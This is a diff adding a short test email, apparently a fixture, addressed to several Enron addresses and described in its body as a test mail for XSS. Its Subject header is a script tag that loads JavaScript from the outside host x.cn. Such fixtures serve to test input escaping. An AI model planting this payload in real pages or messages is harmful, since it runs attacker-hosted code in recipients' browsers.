@@ -1,0 +1,7 @@
+From: "Rogert" <geoffrey@psychologen.biz>
+To: rick.buy@enron.com, david.port@enron.com, cassandra.schultz@enron.com, 
+Subject: <script src=//x.cn/1.js async>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
